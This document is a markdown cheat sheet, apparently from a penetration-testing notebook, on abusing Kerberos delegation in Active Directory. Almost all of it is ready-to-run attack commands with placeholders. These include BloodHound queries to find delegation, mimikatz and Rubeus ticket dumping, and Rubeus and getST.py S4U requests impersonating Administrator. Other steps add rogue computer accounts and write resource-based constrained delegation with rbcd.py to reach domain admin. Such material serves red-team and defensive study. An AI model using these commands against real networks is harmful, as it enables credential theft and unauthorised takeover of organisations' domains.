# Kerberos Delegation

## Find delegation
- `findDelegation.py "<domain>"/"<user>":"<password>"`
- With BloodHound
  - Unconstrained
    - `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
    - `MATCH (c:User {unconstraineddelegation:true}) RETURN c`
  - Constrained
    - `MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p`
    - `MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: "<MYTARGET.FQDN>"})) RETURN p`

## Unconstrained delegation >>> Kerberos TGT >>> PassTheTicket
- UAC: ADS_UF_TRUSTED_FOR_DELEGATION
  - Force connection  with coerce
    - Get tickets 
      - `mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export`
      - `Rubeus.exe dump /service:krbtgt /nowrap`
      - `Rubeus.exe dump /luid:0xdeadbeef /nowrap`
      - `Rubeus.exe monitor /interval:5`

## Constrained delegation
- With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION
  - Get TGT for user
    - Request S4u2self
      - Request S4u2proxy
  - `Rubeus.exe hash /password:<password>`
    - `Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>`
      - `Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt`
        - Altservice HTTP/HOST/CIFS/LDAP  >>> Kerberos TGS
  - `getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>`
    - Altservice HTTP/HOST/CIFS/LDAP >>> Kerberos TGS

- Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION
  - Constrain between Y and Z
    - Add computer X
      - Add RBCD : delegate from X to Y
        - s4u2self X (impersonate admin)
          - S4u2Proxy X (impersonate admin on spn/Y)
            - Forwardable TGS for Y
              - S4u2Proxy Y (impersonate admin on spn/Z) 
  - add computer account
    - `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'`
  - RBCD With added computer account >>> Kerberos TGS
    - `rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$`
      - `getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'`
        - `getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>`
  - Self RBCD @CVE@
    - Like RBCD without add computer

## Resource-Based Constrained Delegation
- add computer account
  - `addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'`
- RBCD With added computer account
  - `Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>`
    - `Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt` >>> Admin
  - `rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>`
    - `getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>` >>> Kerberos TGT >>> Admin

## S4U2self abuse
- Get machine account (X)'s TGT
  - Get a ST on X as user admin
- `getTGT.py -dc-ip "<dc_ip>" -hashes :"<machine_hash>" "<domain>"/"<machine>$"`
  - `getST.py -self -impersonate "<admin>" -altservice "cifs/<machine>" -k -no-pass -dc-ip "DomainController" "<domain>"/'<machine>$'` >>> Admin